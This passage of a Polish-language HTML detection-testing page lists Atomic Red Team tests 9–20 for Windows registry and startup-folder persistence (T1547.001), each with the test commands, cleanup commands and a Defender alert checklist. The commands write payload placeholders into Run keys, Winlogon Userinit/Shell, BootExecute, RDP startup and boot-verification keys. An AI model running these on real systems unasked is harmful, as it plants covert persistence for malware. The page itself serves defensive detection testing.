          <b>Cleanup (powershell):</b>
          <pre>Remove-ItemProperty -Path #{reg_key_path} -Name &quot;socks5_powershell&quot; -Force -ErrorAction Ignore</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\SystemBC_Malware-as-a-Service_Registry\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art09" data-scenario="scenarioBlock" data-label="Atomic Test 9: SystemBC Malware-as-a-Service Registry">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art09','scenarioBlock','Atomic Test 9: SystemBC Malware-as-a-Service Registry')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 10: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value</b>
        <span id="tested-badge-T1547.001-art10" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>New-Item -ItemType Directory -path &quot;#{new_startup_folder}&quot;
Copy-Item -path &quot;#{payload}&quot; -destination &quot;#{new_startup_folder}&quot;
Set-ItemProperty -Path  &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&quot; -Name &quot;Common Startup&quot; -Value &quot;#{new_startup_folder}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Change_Startup_Folder_-_HKLM_Modify_User\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Set-ItemProperty -Path  &quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&quot; -Name &quot;Common Startup&quot; -Value &quot;%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup&quot;
Remove-Item &quot;#{new_startup_folder}&quot; -Recurse -Force</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Change_Startup_Folder_-_HKLM_Modify_User\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art10" data-scenario="scenarioBlock" data-label="Atomic Test 10: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art10','scenarioBlock','Atomic Test 10: Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 11: Change Startup Folder - HKCU Modify User Shell Folders Startup Value</b>
        <span id="tested-badge-T1547.001-art11" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>New-Item -ItemType Directory -path &quot;#{new_startup_folder}&quot;
Copy-Item -path &quot;#{payload}&quot; -destination &quot;#{new_startup_folder}&quot;
Set-ItemProperty -Path  &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&quot; -Name &quot;Startup&quot; -Value &quot;#{new_startup_folder}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Change_Startup_Folder_-_HKCU_Modify_User\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Set-ItemProperty -Path  &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&quot; -Name &quot;Startup&quot; -Value &quot;$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup&quot;
Remove-Item &quot;#{new_startup_folder}&quot; -Recurse -Force</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Change_Startup_Folder_-_HKCU_Modify_User\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art11" data-scenario="scenarioBlock" data-label="Atomic Test 11: Change Startup Folder - HKCU Modify User Shell Folders Startup Value">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art11','scenarioBlock','Atomic Test 11: Change Startup Folder - HKCU Modify User Shell Folders Startup Value')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 12: HKCU - Policy Settings Explorer Run Key</b>
        <span id="tested-badge-T1547.001-art12" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>if (!(Test-Path -Path &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot;)){
  New-Item -ItemType Key -Path  &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot;
}
Set-ItemProperty -Path  &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot; -Name &quot;#{target_key_value_name}&quot; -Value &quot;#{payload}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKCU_-_Policy_Settings_Explorer_Run_Key\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-ItemProperty -Path  &quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot; -Name &quot;#{target_key_value_name}&quot;</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKCU_-_Policy_Settings_Explorer_Run_Key\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art12" data-scenario="scenarioBlock" data-label="Atomic Test 12: HKCU - Policy Settings Explorer Run Key">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art12','scenarioBlock','Atomic Test 12: HKCU - Policy Settings Explorer Run Key')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 13: HKLM - Policy Settings Explorer Run Key</b>
        <span id="tested-badge-T1547.001-art13" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>if (!(Test-Path -Path &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot;)){
  New-Item -ItemType Key -Path  &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot;
}
Set-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot; -Name &quot;#{target_key_value_name}&quot; -Value &quot;#{payload}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Policy_Settings_Explorer_Run_Key\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>Remove-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&quot; -Name &quot;#{target_key_value_name}&quot;</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Policy_Settings_Explorer_Run_Key\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art13" data-scenario="scenarioBlock" data-label="Atomic Test 13: HKLM - Policy Settings Explorer Run Key">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art13','scenarioBlock','Atomic Test 13: HKLM - Policy Settings Explorer Run Key')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 14: HKLM - Append Command to Winlogon Userinit KEY Value</b>
        <span id="tested-badge-T1547.001-art14" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>$oldvalue = $(Get-ItemPropertyValue -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Userinit&quot;);
Set-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Userinit-backup&quot; -Value &quot;$oldvalue&quot;;
$newvalue = $oldvalue + &quot; #{payload}&quot;;
Set-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Userinit&quot; -Value &quot;$newvalue&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Append_Command_to_Winlogon_Userin\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>$oldvalue = $(Get-ItemPropertyValue -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name 'Userinit-backup');
Set-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Userinit&quot; -Value &quot;$oldvalue&quot;;
Remove-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name 'Userinit-backup'</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Append_Command_to_Winlogon_Userin\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art14" data-scenario="scenarioBlock" data-label="Atomic Test 14: HKLM - Append Command to Winlogon Userinit KEY Value">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art14','scenarioBlock','Atomic Test 14: HKLM - Append Command to Winlogon Userinit KEY Value')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 15: HKLM - Modify default System Shell - Winlogon Shell KEY Value</b>
        <span id="tested-badge-T1547.001-art15" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>$oldvalue = $(Get-ItemPropertyValue -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Shell&quot;);
Set-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Shell-backup&quot; -Value &quot;$oldvalue&quot;;
$newvalue = $oldvalue + &quot;, #{payload}&quot;;
Set-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Shell&quot; -Value &quot;$newvalue&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Modify_default_System_Shell_-_Win\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>$oldvalue = $(Get-ItemPropertyValue -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name 'Shell-backup');
Set-ItemProperty -Path &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name &quot;Shell&quot; -Value &quot;$oldvalue&quot;;
Remove-ItemProperty -Path  &quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; -Name 'Shell-backup'</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\HKLM_-_Modify_default_System_Shell_-_Win\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art15" data-scenario="scenarioBlock" data-label="Atomic Test 15: HKLM - Modify default System Shell - Winlogon Shell KEY Value">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art15','scenarioBlock','Atomic Test 15: HKLM - Modify default System Shell - Winlogon Shell KEY Value')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 16: secedit used to create a Run key in the HKLM Hive</b>
        <span id="tested-badge-T1547.001-art16" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>secedit /import /db #{secedit_db} /cfg &quot;#{ini_file}&quot;
secedit /configure /db #{secedit_db}</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\secedit_used_to_create_a_Run_key_in_the_\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot; /V &quot;calc&quot; /f &gt;nul 2&gt;&1</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\secedit_used_to_create_a_Run_key_in_the_\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art16" data-scenario="scenarioBlock" data-label="Atomic Test 16: secedit used to create a Run key in the HKLM Hive">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art16','scenarioBlock','Atomic Test 16: secedit used to create a Run key in the HKLM Hive')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-ps">PowerShell</span>
        <b>Atomic Test 17: Modify BootExecute Value</b>
        <span id="tested-badge-T1547.001-art17" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (powershell):</b>
          <pre>if (!(Test-Path &quot;$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg&quot;)) { reg.exe export &quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager&quot; &quot;$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg&quot; /y }
Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager&quot; -Name &quot;BootExecute&quot; -Value &quot;#{registry_value}&quot; -Type MultiString</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Modify_BootExecute_Value\test_1.ps1" download>Pobierz test_1.ps1</a><br>
        <div class="test-cleanup">
          <b>Cleanup (powershell):</b>
          <pre>reg.exe import &quot;$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg&quot;
Remove-Item -Path &quot;$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg&quot; -Force</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Modify_BootExecute_Value\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art17" data-scenario="scenarioBlock" data-label="Atomic Test 17: Modify BootExecute Value">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art17','scenarioBlock','Atomic Test 17: Modify BootExecute Value')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 18: Allowing custom application to execute during new RDP logon session</b>
        <span id="tested-badge-T1547.001-art18" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd&quot; /f /v StartupPrograms /t REG_SZ /d &quot;#{malicious_app}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Allowing_custom_application_to_execute_d\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd&quot; /f /v StartupPrograms /t REG_SZ /d &quot;rdpclip&quot;</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Allowing_custom_application_to_execute_d\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art18" data-scenario="scenarioBlock" data-label="Atomic Test 18: Allowing custom application to execute during new RDP logon session">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art18','scenarioBlock','Atomic Test 18: Allowing custom application to execute during new RDP logon session')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 19: Creating Boot Verification Program Key for application execution during successful boot</b>
        <span id="tested-badge-T1547.001-art19" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d &quot;#{malicious_file}&quot;</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Creating_Boot_Verification_Program_Key_f\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>reg delete HKLM\System\CurrentControlSet\Control\BootVerificationProgram /f</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Creating_Boot_Verification_Program_Key_f\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art19" data-scenario="scenarioBlock" data-label="Atomic Test 19: Creating Boot Verification Program Key for application execution during successful boot">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art19','scenarioBlock','Atomic Test 19: Creating Boot Verification Program Key for application execution during successful boot')">Resetuj</button>
        </div>
      </div>
    </div>

    <div class="art-accordion">
      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
        <span class="badge badge-cmd">CMD</span>
        <b>Atomic Test 20: Add persistence via Windows Context Menu</b>
        <span id="tested-badge-T1547.001-art20" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
      </button>
      <div class="art-accordion-content">
        <div class="test-desc"><b>Opis:</b> </div>

        <div>
          <b>Polecenia testowe (cmd):</b>
          <pre>reg add &quot;HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify\command&quot; /ve /t REG_SZ /d &quot;C:\Windows\System32\calc.exe&quot; /f</pre>
          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_persistence_via_Windows_Context_Menu\test_1.cmd" download>Pobierz test_1.cmd</a><br>
        <div class="test-cleanup">
          <b>Cleanup (cmd):</b>
          <pre>reg delete &quot;HKEY_CLASSES_ROOT\Directory\Background\shell\Size Modify&quot; /f</pre>
        </div>
<a href="..\..\scenarios\atomic_tests\T1547.001\Add_persistence_via_Windows_Context_Menu\cleanup_1.cmd" download>Pobierz cleanup_1.cmd</a><br>
        <div class="art-checklist" id="checklist-T1547.001-art20" data-scenario="scenarioBlock" data-label="Atomic Test 20: Add persistence via Windows Context Menu">
          <label><input type="checkbox"> Uruchomiono test</label><br>
          <label><input type="checkbox"> Wykonano cleanup</label><br>
          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
          <label><input type="checkbox"> Utworzono alert</label><br>
          <button onclick="resetChecklist('T1547.001','art20','scenarioBlock','Atomic Test 20: Add persistence via Windows Context Menu')">Resetuj</button>
        </div>
      </div>
    </div>

  </div>
  <div class="author section"><b>Author:</b> Krzysztof K.</div>
</div>
</body>
</html>
